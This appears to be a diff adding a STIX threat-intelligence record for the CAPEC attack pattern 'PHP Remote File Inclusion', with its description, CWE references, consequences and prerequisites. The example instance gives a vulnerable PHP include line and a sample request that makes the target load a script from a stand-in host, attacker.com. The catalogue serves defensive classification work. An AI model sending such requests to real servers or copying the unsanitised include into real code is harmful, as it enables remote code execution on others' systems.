@@ -1,0 +1,103 @@
+{
+    "type": "bundle",
+    "id": "bundle--bfc6289d-b16e-4802-8ebd-c197630e12ec",
+    "spec_version": "2.0",
+    "objects": [
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--51cf3883-1993-49d1-a6c6-169cabf71adb",
+            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
+            "created": "2014-06-23T00:00:00.000Z",
+            "modified": "2019-04-04T00:00:00.000Z",
+            "name": "PHP Remote File Inclusion",
+            "description": "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized \"include\" or \"require\" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.",
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "url": "https://capec.mitre.org/data/definitions/193.html",
+                    "external_id": "CAPEC-193"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/98.html",
+                    "external_id": "CWE-98"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/80.html",
+                    "external_id": "CWE-80"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/714.html",
+                    "external_id": "CWE-714"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
+                    "url": "http://projects.webappsec.org/Remote-File-Inclusion",
+                    "external_id": "REF-59"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "Shaun Clowes, A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications, Blackhat Briefings Asia 2001",
+                    "url": "http://securereality.com.au/studyinscarlett/",
+                    "external_id": "REF-60"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "OWASP Top 10 (2007), The Open Web Application Security Project (OWASP)",
+                    "url": "http://www.owasp.org/index.php/Top_10_2007-A3",
+                    "external_id": "REF-45"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
+            ],
+            "x_capec_abstraction": "Detailed",
+            "x_capec_consequences": {
+                "Access_Control": [
+                    "Bypass Protection Mechanism"
+                ],
+                "Accountability": [
+                    "Gain Privileges"
+                ],
+                "Authentication": [
+                    "Gain Privileges"
+                ],
+                "Authorization": [
+                    "Execute Unauthorized Commands (Run Arbitrary Code)",
+                    "Gain Privileges",
+                    "Bypass Protection Mechanism"
+                ],
+                "Confidentiality": [
+                    "Read Data"
+                ],
+                "Integrity": [
+                    "Modify Data"
+                ],
+                "Non-Repudiation": [
+                    "Gain Privileges"
+                ]
+            },
+            "x_capec_example_instances": [
+                "\n               <xhtml:div style=\"margin-left:10px;\">\n                  <xhtml:ul>\n                     <xhtml:li>The adversary controls a PHP script on a server \"http://attacker.com/rfi.txt\"</xhtml:li>\n                     <xhtml:li>The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt')</xhtml:li>\n                     <xhtml:li>The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the \".txt\" prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.</xhtml:li>\n                  </xhtml:ul>\n               </xhtml:div>\n            "
+            ],
+            "x_capec_likelihood_of_attack": "High",
+            "x_capec_prerequisites": [
+                "Target application server must allow remote files to be included in the \"require\", \"include\", etc. PHP directives",
+                "The adversary must have the ability to make HTTP requests to the target web application."
+            ],
+            "x_capec_resources_required": [
+                "None: No specialized resources are required to execute this type of attack."
+            ],
+            "x_capec_skills_required": {
+                "Low": "To inject the malicious payload in a web page",
+                "Medium": "To bypass filters in the application"
+            },
+            "x_capec_status": "Draft",
+            "x_capec_typical_severity": "High",
+            "x_capec_version": "3.2"
+        }
+    ]
+}
